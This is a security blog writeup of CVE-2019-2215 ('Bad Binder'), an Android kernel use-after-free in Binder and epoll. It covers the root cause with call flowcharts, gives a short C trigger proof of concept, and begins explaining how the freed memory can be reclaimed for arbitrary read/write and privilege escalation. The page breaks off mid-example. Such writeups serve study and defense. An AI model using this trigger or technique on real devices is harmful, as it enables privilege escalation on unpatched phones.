<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="CVE-2019-2215 Bad Binder Writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://vtl0.com/posts/bad_binder/" /><meta property="og:url" content="https://vtl0.com/posts/bad_binder/" /><meta property="og:site_name" content="biazo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-05-27T00:00:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="CVE-2019-2215 Bad Binder Writeup" /><meta name="twitter:site" content="@vtlzero" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-29T22:38:51-04:00","datePublished":"2023-05-27T00:00:00-04:00","description":"Overview","headline":"CVE-2019-2215 Bad Binder Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://vtl0.com/posts/bad_binder/"},"url":"https://vtl0.com/posts/bad_binder/"}</script><title>CVE-2019-2215 Bad Binder Writeup | biazo</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="biazo"><meta name="application-name" content="biazo"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://cdn.jsdelivr.net/gh/elbiazo/elbiazo.github.io/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">biazo</a></div><div class="site-subtitle font-italic">Security Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/elbiazo" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/vtlzero" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['elbiazo','icloud.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>CVE-2019-2215 Bad Binder Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>CVE-2019-2215 Bad Binder Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1685160000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 27, 2023 </em> </span> <span> Updated <em class="" data-ts="1685414331" data-df="ll" data-toggle="tooltip" data-placement="bottom"> May 29, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/elbiazo">biazo</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3588 words"> <em>19 min</em> read</span></div></div></div><div class="post-content"><h2 id="overview"><span class="mr-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Bad Binder (<code class="language-plaintext highlighter-rouge">CVE-2019-2215</code>) is a <code class="language-plaintext highlighter-rouge">UaF</code> in <code class="language-plaintext highlighter-rouge">Binder</code> (Android IPC) and <code class="language-plaintext highlighter-rouge">epoll</code> (Async IO). This blog will go over why there is use-after-free (UaF) and how we can use UaF to achieve arbitrary read/write and perform a Privilege Escalation (PE).</p><h2 id="exploit"><span class="mr-2">Exploit</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Exploit for this writeup will be hosted <a href="https://github.com/elbiazo/CVE-2019-2215">here</a></p><h2 id="environment-setup"><span class="mr-2">Environment Setup</span><a href="#environment-setup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Since this bug is in <code class="language-plaintext highlighter-rouge">Binder</code> and doesn’t require vendor specific kernel module, we can use <code class="language-plaintext highlighter-rouge">goldfish</code> kernel in <code class="language-plaintext highlighter-rouge">AVD</code> (Android Emulator Virtual Devices). It will be for <code class="language-plaintext highlighter-rouge">Intel x64</code> CPU but it should work with <code class="language-plaintext highlighter-rouge">Arm</code> CPU with minor update since this exploit is data only. Things like fields in structure might be different. <a href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/environment-setup.html">HackSysTeam’s Bad Binder Exploitation Workshop</a>. Have good tutorial on how to set this environment.</p><h2 id="root-cause-analysis"><span class="mr-2">Root Cause Analysis</span><a href="#root-cause-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="tldr-summary"><span class="mr-2">TL;DR Summary</span><a href="#tldr-summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ol><li><code class="language-plaintext highlighter-rouge">fd = open("/dev/binder", O_RDONLY);</code> Allocates <code class="language-plaintext highlighter-rouge">binder_thread.wait</code> which is linked list.<li><code class="language-plaintext highlighter-rouge">epfd = epoll_create(1000);</code> Creates <code class="language-plaintext highlighter-rouge">epoll</code> structure.<li><code class="language-plaintext highlighter-rouge">epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event);</code> Will create <code class="language-plaintext highlighter-rouge">epoll_entry</code> and set <code class="language-plaintext highlighter-rouge">epoll_entry.whead</code> to point to <code class="language-plaintext highlighter-rouge">binder_thread.wait</code><li><code class="language-plaintext highlighter-rouge">ioctl(fd, BINDER_THREAD_EXIT, NULL);</code> <strong>Frees</strong> <code class="language-plaintext highlighter-rouge">binder_thread.wait</code>. Problem is <code class="language-plaintext highlighter-rouge">epoll_entry.whead</code> still points to <code class="language-plaintext highlighter-rouge">binder_thread.wait</code>.<li><code class="language-plaintext highlighter-rouge">epoll_ctl(epfd, EPOLL_CTL_DEL, fd, NULL);</code> Will try to <strong>unlink</strong> <code class="language-plaintext highlighter-rouge">epoll_entry</code> by calling <code class="language-plaintext highlighter-rouge">__list_del()</code>. This <strong>unlinking</strong> gives you ability to write <code class="language-plaintext highlighter-rouge">0x10</code> bytes to where <code class="language-plaintext highlighter-rouge">binder_thread.wait</code> was.</ol><h3 id="trigger-poc"><span class="mr-2"><a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">Trigger PoC</a></span><a href="#trigger-poc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="c1">// From Project Zero blog </span>
<span class="c1">// https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html</span>

<span class="cp">#include &lt;fcntl.h&gt;
#include &lt;sys/epoll.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="cp">#define BINDER_THREAD_EXIT 0x40046208ul
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>

<span class="p">{</span>
        <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">epfd</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">epoll_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">events</span> <span class="o">=</span> <span class="n">EPOLLIN</span> <span class="p">};</span>

        <span class="c1">// Create binder_thread structure</span>
        <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/binder"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>

        <span class="c1">// size for epoll_create can be any uint32_t &gt; 0</span>
        <span class="n">epfd</span> <span class="o">=</span> <span class="n">epoll_create</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>

        <span class="c1">// Link binder_thread.wait to epoll_entry.whead</span>
        <span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">EPOLL_CTL_ADD</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">);</span>

        <span class="c1">// Free binder_thread.wait</span>
        <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">BINDER_THREAD_EXIT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

        <span class="c1">// Unlink epoll_entry.whead causing UaF</span>
        <span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">EPOLL_CTL_DEL</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="allocations"><span class="mr-2">Allocations</span><a href="#allocations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="high-level-flowchart"><span class="mr-2">High Level Flowchart</span><a href="#high-level-flowchart" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><a href="/assets/img/2023-05-27-17-09-41.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-17-09-41.png" alt="" class="lazyload" data-proofer-ignore></a></p><h4 id="opening-binder"><span class="mr-2">Opening Binder</span><a href="#opening-binder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c1">// Create binder_thread structure</span>
<span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/binder"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</pre></table></code></div></div><h5 id="allocating-binder_proc"><span class="mr-2">Allocating <code class="language-plaintext highlighter-rouge">binder_proc</code></span><a href="#allocating-binder_proc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-mermaid">flowchart LR
f1["open"] --&gt; f2["binder_open"] --&gt; f3["kzalloc"]
</code></pre><p>Allocates <code class="language-plaintext highlighter-rouge">struct binder_proc *proc</code>. This will get used to create <code class="language-plaintext highlighter-rouge">binder_thread</code> <strong>later</strong>.</p><h4 id="creating-epoll"><span class="mr-2">Creating epoll</span><a href="#creating-epoll" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c1">// size for epoll_create can be any uint32_t &gt; 0</span>
<span class="n">epfd</span> <span class="o">=</span> <span class="n">epoll_create</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</pre></table></code></div></div><h5 id="allocating-eventpoll"><span class="mr-2">Allocating <code class="language-plaintext highlighter-rouge">eventpoll</code></span><a href="#allocating-eventpoll" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-mermaid">flowchart LR
f1[poll_create] --&gt; epoll_create1 --&gt; ep_alloc
</code></pre><p>Allocates <code class="language-plaintext highlighter-rouge">struct eventpoll *ep</code>. This will eventually create and link <code class="language-plaintext highlighter-rouge">epoll_entry</code> when ` <code class="language-plaintext highlighter-rouge">epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event)</code> is called.</p><h4 id="adding-binder-to-epoll"><span class="mr-2">Adding Binder to epoll</span><a href="#adding-binder-to-epoll" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c1">// Link binder_thread.wait to epoll_entry.whead</span>
<span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">EPOLL_CTL_ADD</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">);</span>
</pre></table></code></div></div><h5 id="allocating-epitem-eventpoll-item-and-linking-to-eventpoll"><span class="mr-2">Allocating epitem (eventpoll item) and linking to eventpoll</span><a href="#allocating-epitem-eventpoll-item-and-linking-to-eventpoll" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-mermaid">flowchart LR
f1["epoll_ctl (EPOLL_CTL_ADD)"] --&gt; ep_insert --&gt; kmem_cache_alloc
</code></pre><p>If its hasn’t created before, it wil create epi (eventpoll item) and <strong>link</strong> it to <code class="language-plaintext highlighter-rouge">eventpoll.rbr</code>. <code class="language-plaintext highlighter-rouge">rbr</code> is red black tree that holds all the <code class="language-plaintext highlighter-rouge">epitem</code>.</p><p><a href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/root-cause-analysis.html#syscall-epoll-ctl">Below given diagram shows how an <code class="language-plaintext highlighter-rouge">epitem</code> structure is linked to <code class="language-plaintext highlighter-rouge">eventpoll</code> structure. Image is from HackSysTeam</a></p><p><a href="/assets/img/2023-05-27-16-40-56.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-40-56.png" alt="" class="lazyload" data-proofer-ignore></a></p><h5 id="allocating-binder_thread"><span class="mr-2">Allocating binder_thread</span><a href="#allocating-binder_thread" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Continuing from <code class="language-plaintext highlighter-rouge">ep_insert</code> above</p><pre><code class="language-mermaid">flowchart TD
f1[ep_insert] --&gt; f2["init_poll_func_ptr(&amp;epq.pt, ep_ptable_queue_proc)"] --&gt; f3[ep_item_poll] --&gt; f4[binder_poll] --&gt; f5[binder_get_thread] --&gt; f6[kzalloc]
</code></pre><ol><li><code class="language-plaintext highlighter-rouge">init_poll_func_ptr(&amp;epq.pt, ep_ptable_queue_proc)</code> sets <code class="language-plaintext highlighter-rouge">epq.pt._qproc</code> to <code class="language-plaintext highlighter-rouge">ep_ptable_queue_proc</code><li><code class="language-plaintext highlighter-rouge">binder_get_thread</code> will allocate binder_thread</ol><h5 id="allocating-eppoll_entry"><span class="mr-2">Allocating eppoll_entry</span><a href="#allocating-eppoll_entry" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Continuing from <code class="language-plaintext highlighter-rouge">binder_poll</code> above</p><pre><code class="language-mermaid">flowchart TD
f1[binder_poll] --&gt; f2["poll_wait(flip, &amp;thread-&gt;wait, wait)"] --&gt; f3["p-&gt;_qproc (ep_ptable_queue_proc)"] --&gt; f4[kmem_cache_alloc]
</code></pre><ol><li>poll_wait pass <code class="language-plaintext highlighter-rouge">thread-&gt;wait</code> as parameter. This is list_queue that will be linked to <code class="language-plaintext highlighter-rouge">epoll_entry</code> in next step. If you remember this is the pointer where <code class="language-plaintext highlighter-rouge">UaF</code> happens<ul><li><code class="language-plaintext highlighter-rouge">p-&gt;_qproc</code> was set as <code class="language-plaintext highlighter-rouge">ep_ptable_queue_proc</code> from previous step</ul></ol><h5 id="linking-epitem---epoll_entry---binder_thread"><span class="mr-2">Linking epitem -&gt; epoll_entry -&gt; binder_thread</span><a href="#linking-epitem---epoll_entry---binder_thread" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Continuation from <code class="language-plaintext highlighter-rouge">ep_ptable_queue_proc</code> from before</p><pre><code class="language-mermaid">flowchart TD
f1[ep_ptable_queue_proc] --&gt; f2["add_wait_queue(whead, &amp;pwq-&gt;wait)"]
f1 --&gt; f3["list_add_tail(&amp;pwq-&gt;llink, &amp;epi-&gt;pwqlist)"]
</code></pre><ol><li>add_wait_queue will link <code class="language-plaintext highlighter-rouge">pwq.wait</code> to <code class="language-plaintext highlighter-rouge">binder_thread.wait</code><li>list_add_tail will link <code class="language-plaintext highlighter-rouge">epi.pwqlist</code> to <code class="language-plaintext highlighter-rouge">pwq.llink</code></ol><p>It will look something like this</p><pre><code class="language-mermaid">flowchart LR
f1[epi.pwqlist] --&gt; pwq.wait --&gt; binder_thread.wait
</code></pre><p><a href="https://cloudfuzz.github.io/android-kernel-exploitation/chapters/root-cause-analysis.html#syscall-epoll-ctl">Below given diagram shows how <code class="language-plaintext highlighter-rouge">eventpoll</code> structure is connected with <code class="language-plaintext highlighter-rouge">binder_thread</code> structure. Image is from HackSysTeam</a></p><p><a href="/assets/img/2023-05-27-16-41-36.png" class="popup img-link "><img data-src="/assets/img/2023-05-27-16-41-36.png" alt="" class="lazyload" data-proofer-ignore></a></p><h3 id="free"><span class="mr-2">Free</span><a href="#free" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c1">// Free binder_thread.wait</span>
<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">BINDER_THREAD_EXIT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></table></code></div></div><pre><code class="language-mermaid">flowchart TD
binder_ioctl --&gt; binder_thread_release --&gt; binder_thread_dec_tmp_ref --&gt; binder_thread_dec_tmpref --&gt; f1["binder_free_thread(thread)"]
</code></pre><p>This will free binder_thread structure</p><h3 id="use-after-free-uaf"><span class="mr-2">Use after Free (UaF)</span><a href="#use-after-free-uaf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c1">// Unlink epoll_entry.whead causing UaF</span>
<span class="n">epoll_ctl</span><span class="p">(</span><span class="n">epfd</span><span class="p">,</span> <span class="n">EPOLL_CTL_DEL</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</pre></table></code></div></div><pre><code class="language-mermaid">flowchart TD
f1["epoll_ctl (EPOLL_CTL_DEL)"]--&gt; ep_remove --&gt; ep_unregister_pollwait --&gt; ep_remove_wait_queue --&gt;remove_wait_queue --&gt; __remove_wait_queue --&gt; uaf["list_del(&amp;wq_entry-&gt;entry)"]
</code></pre><p><code class="language-plaintext highlighter-rouge">wq_entry-&gt;entry</code> is actually <code class="language-plaintext highlighter-rouge">pwq-&gt;wait</code>. We know that <code class="language-plaintext highlighter-rouge">binder_thread</code> have been freed from previous step. However, it is still trying to call <code class="language-plaintext highlighter-rouge">list_del</code> on <code class="language-plaintext highlighter-rouge">pwq.wait</code> which is link list pointer to <code class="language-plaintext highlighter-rouge">binder_thread.wait</code>.</p><pre><code class="language-mermaid">flowchart TD
f1[epi.pwqlist] --&gt; fp["pwq.wait points to where binder_thread.wait used to be"]--&gt; fb["freed binder_thread.wait"]
</code></pre><h4 id="list_del-operation"><span class="mr-2">list_del operation</span><a href="#list_del-operation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><pre><code class="language-mermaid">flowchart LR
list_del --&gt; __list_del_entry --&gt; __list_del
</code></pre><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">__list_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span> <span class="n">prev</span><span class="p">,</span> <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span> <span class="n">next</span><span class="p">)</span>
<span class="p">{</span>
        <span class="n">next</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">prev</span><span class="p">;</span>
        <span class="n">WRITE_ONCE</span><span class="p">(</span><span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span> <span class="n">next</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">next</code> and <code class="language-plaintext highlighter-rouge">prev</code> is field of <code class="language-plaintext highlighter-rouge">pwq.wait</code>. <code class="language-plaintext highlighter-rouge">next-&gt;prev</code> and <code class="language-plaintext highlighter-rouge">prev-&gt;next</code> should both point to where <code class="language-plaintext highlighter-rouge">binder_thread.wait</code> used to be.</p><p>Let’s rewrite this so its easier to understand</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">where_binder_thread_used_to_be</span><span class="o">+</span><span class="mi">8</span> <span class="o">=</span> <span class="n">pwq</span><span class="p">.</span><span class="n">wait</span><span class="p">.</span><span class="n">prev</span><span class="p">;</span> <span class="c1">// + 8 since prev is 8 bytes after next</span>
<span class="n">where_binder_thread_used_to_be</span> <span class="o">=</span> <span class="n">pwq</span><span class="p">.</span><span class="n">wait</span><span class="p">.</span><span class="n">next</span><span class="p">;</span>
</pre></table></code></div></div><p>Pretty much it will write address of <code class="language-plaintext highlighter-rouge">where_binder_thread_used_to_be</code> into that address.</p><p>If we can allocate kmalloc that matches binder_thread size and do <code class="language-plaintext highlighter-rouge">list_del</code>, we can override the (new_struct+0xa0) and (new_struct+0xa8) with address of nwe_struct+0xa0.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="p">(</span><span class="n">new_struct</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">)</span> <span class="o">=</span> <span class="n">new_struct</span><span class="o">+</span><span class="mh">0xa0</span>
<span class="o">*</span><span class="p">(</span><span class="n">new_struct</span><span class="o">+</span><span class="mh">0xa8</span><span class="p">)</span> <span class="o">=</span> <span class="n">new_struct</span><span class="o">+</span><span class="mh">0xa0</span>
</pre></table></code></div></div><h2 id="exploitation"><span class="mr-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First, to use this <code class="language-plaintext highlighter-rouge">UaF</code>, we would need to find interesting struct that matches <code class="language-plaintext highlighter-rouge">struct binder_thread</code>’s <code class="language-plaintext highlighter-rouge">kmalloc</code> size which is <code class="language-plaintext highlighter-rouge">kmalloc-512</code>.</p><h3 id="vectored-io"><span class="mr-2">Vectored I/O</span><a href="#vectored-io" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Vectored I/O (iov) is a way to send multiple buffer with single function. This is great because it will use less syscalls then calling <code class="language-plaintext highlighter-rouge">write</code> one by one.</p><h4 id="example-from-wiki"><span class="mr-2"><a href="https://en.wikipedia.org/wiki/Vectored_I/O">Example from Wiki</a></span><a href="#example-from-wiki" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/uio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="n">buf1</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"Hello, "</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="n">buf2</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"Wikipedia "</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="n">buf3</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"Community!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">iovec</span> <span class="n">bufs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
